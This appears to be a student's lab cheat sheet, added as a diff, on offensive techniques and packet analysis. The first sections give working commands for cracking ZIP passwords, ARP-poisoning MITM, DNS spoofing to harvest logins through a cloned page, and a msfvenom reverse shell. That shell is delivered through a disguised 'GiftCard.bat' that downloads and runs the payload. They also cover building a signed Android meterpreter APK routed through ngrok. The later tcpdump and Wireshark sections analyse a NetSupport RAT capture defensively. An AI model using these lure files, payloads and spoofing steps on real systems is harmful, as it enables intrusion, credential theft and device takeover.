@@ -1,0 +1,225 @@
+1. Password cracking using John the ripper
+	zip2john file.zip > hash.hash
+	john --wordlist=/usr/share/wordlists/rockyou.txt -rule=jumbo hash.hash
+if above one doesn't work: run -> rm ~/.john/john.pot
+generic command:	john --wordlist=<wordlist> --rules=<rulename> --config=<configfile> --format=<format> hasfile.hash
+			
+example:		john --wordlist=/usr/share/wordlists/rockyou.txt -rule=jumbo hash.hash
+			
+
+
+2. MITM
+Allow forwarding
+	sudo sysctl net.ipv4.ip_forward=1
+Open Ettercap
+	sudo Ettercap -G
+	Switch On Sniffing at startup
+	Tick
+Sniffing will start
+	three dots
+	Hosts
+	Scan for hosts
+	add the targets
+	note the mac addresses
+	Open wireshark
+	on Ettercap 
+		World Icon
+		Arp Poisoning
+		Click Ok
+	
+Traffic from target A to target B should be seen on kali
+
+
+3. DNS Spoofing
+sudo setoolkit
+Option 1
+2
+3
+1
+put kali ip if asked
+2
+open Ettercap
+scan for hosts
+select target host
+sudo vi /etc/Ettercap/etter.dns
+	*at the end, add
+		gateway.local	A	<kali ip>
+		google.com	A	<kali ip>
+		starbucks.com	A	<kali ip>
+	:wq
+sudo vi /etc/Ettercap/etter.conf
+	*change ec_uid and ec_gid to 0.
+sudo Ettercap -G
+Tick on top
+scan for hosts
+select target and add as target 1, select domain controller and set as target 2.
+start arp poisioning
+World icon
+	Arp poisoning
+	Check Sniff remote connections
+Three dot icon
+	Plugin -> Manage plugins
+	double click dns_spoof and ensure the astrick apprers
+go to target and open google.com
+accessed id and password will be shown in the setoolkit
+
+
+4. Reverse Shell
+terminal 1:
+	msfvenom -p cmd/windows/reverse_powershell lhost=10.0.1.17 lport=1337 > shell.txt
+	python3 -m http.server
+terminal 2:
+	sudo apt install netcat-traditional
+	nc -lvp 1337
+Windows:
+GiftCard.bat
+*following command is from pdf:
+	@ECHO off
+powershell -Command “Invoke-WebRequest -URI http://<kali ip>:8000/shell.txt -OutFile c:\Windows\Temp\shell.bat; c:\Windows\Temp\shell.bat” 
+
+*following command is from chatgpt:
+@echo off
+powershell -Command "Invoke-WebRequest -Uri 'http://192.168.1.198:8000/shell.txt' -OutFile 'C:\Windows\Temp\shell.bat'; Start-Process 'C:\Windows\Temp\shell.bat'"
+
+
+run GiftCard.bat as administrator
+interact by giving basic enumeration commands
+ipconfig
+whoami
+dir
+
+5. Android Reverse Shell
+1.	Go to: https://ngrok.com. Crreate your account and authenticate with the token from the directory where ngrok is downloaded.
+2.	From the same directory:
+./ngrok tcp <port number> (Ex: ./ngrok tcp 5432)
+3.	Create an apk flle in Kali linux using msfvenom:
+msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=17197 -f apk > /root/testngrok.apk  ((or -o /root/ngroktest.apk)
+4.	Install java in Kali:
+sudo apt update
+sudo apt install default-jdk -y
+sudo apt install android-sdk -y
+sudo apt install apksigner
+
+Verify:
+java -version
+keytool -help
+jarsigner -help
+5.	Create a keystore:
+keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+6.	Sign the apk:
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore testngrok.apk alias_name
+		or newer method:
+		zipalign -v -p 4 testngrok.apk testngrok-aligned.apk
+		apksigner sign --ks my-release-key.keystore --ks-key-alias alias_name --out testngrok-signed.apk testngrok-aligned.apk
+		apksigner verify -v testngrok-signed.apk
+
+
+
+
+
+6. Tcp dump
+	In Kali to monitor:
+Service postgresql start
+
+6.tcpdump
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+1. Download link of pcap file: https://malware-traffic-analysis.net/2024/11/26/index.html
+
+We’ll analyze the file 2024-11-26-traffic-analysis-exercise.pcap, which contains traffic from a host infected with NetSupport RAT, a known remote access Trojan.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+2.To view the contents of a PCAP file with TCPdump, navigate to where the file was downloaded and unzipped and use the -r option to read the file:
+	
+#sudo tcpdump -r 2024-11-26-traffic-analysis-exercise.pcap
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+3.get the total packet count 
+
+#sudo tcpdump -r 2024-11-26-traffic-analysis-exercise.pcap –count
+
+26922 packets total
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+4.to read in human readble language 
+
+#tcpdump -tttt -r 2024-11-26-traffic-analysis-exercise.pcap
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+5.Add Source IP Filtering: Based on the alerts we can surmise that 10.11.26.183 is the infected host. Filter packets where this IP and 194.180.191.64 is involved and check the count of packets.
+
+#tcpdump -r 2024-11-26-traffic-analysis-exercise.pcap host 10.11.26.183 and host 194.180.191.64 -tttt –count
+
+this will give 132 filtered packets 
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+6. Add the -n flag to prevent the TCPdump from resolving IP addresses to hostnames, speeding up the capture and keeping the output in raw IP format..
+		
+
+#tcpdump -n -r 2024-11-26-traffic-analysis-exercise.pcap host 10.11.26.183 and host 194.180.191.64 -tttt
+
+
+we confirm the traffic between 10.11.26.183 and 194[.]180[.]191[.]64.
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+7.NetSupport service is known to be widely abused and used in NetSupportRAT.and we can see netsupport manager/gateway etc on screen 
+
+#tcpdump -n -A -tttt -r 2024-11-26-traffic-analysis-exercise.pcap host 10.11.26.183 and host 194.180.191.64
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+8.Search for Specific HTTP Requests: Use grep to find GET and POST requests, which may indicate interactions with web resources. Be sure to use the -A flag to filter for ASCII characters.
+
+#tcpdump -n -A -r 2024-11-26-traffic-analysis-exercise.pcap host 10.11.26.183 and host 194.180.191.64 -tttt | grep -E "GET|POST"
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+9.As seen below, we see multiple POST requests to 194[.]180[.]191[.]64/fakeurl[.]htm
+
+and open virus total > put the URL
+
+                   http://194.180.191.64/fakeurl.htm
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+under community > comment > MalareName:NetSupportManager RAT 
+
+
+
+
+
+
+7. Wireshark
+Don't do this in Windows
+Analyse pcap file because it contains traffic from a host infected with NetSupport RAT
+
+Group alert by destination ip and alert count
+Statistics -> Connections
+
+To see successful connections, make "basic" filter
+Basic : 	(http.request or tls.handshake.type eq 1) and !(ssdp)
+
+once we locate the packet from the filtered packet (alert image shows the suspicious ip), right click and "follow tcp stream"
+
+By reviewing the header, we discover two interesting entries in the POST request. The first one is the URL 194.180.191.64/fakeurl.htm. The second item of interest is the User Agent String, NetSupport Manager. The NetSupport service is known to be widely abused and used in NetSupportRAT. If your organization does not use this service, this is almost certainly malicious activity.
+copy the link in tcp header and scan in virustotal.com site
+
+We can discover the victim, by running the filter below for LDAP traffic:
+
+		ldap.AttributeDescription == "givenName”
+
+Digging Deeper for the Root Cause
+Using the basic+ DNS filter button, we can see two domains of interest, classicgrande.com and modandcrackedapk.com.
+	(http.request or tls.handshake.type eq 1 or (tcp.flags.syn eq 1 and tcp.flags.ack eq 0) or dns) and !(ssdp)
+
+As seen above classicgrand.com was visited 2024-11-26 23:50:11. The first call out to the C2 was at 2024-11-26 23:50:45, 34 seconds after visiting classicgrand.com.
+
+go to modandcrackedapk.com
+a file may be asked to download. don't do it.
+
+paste this url on virus total
+
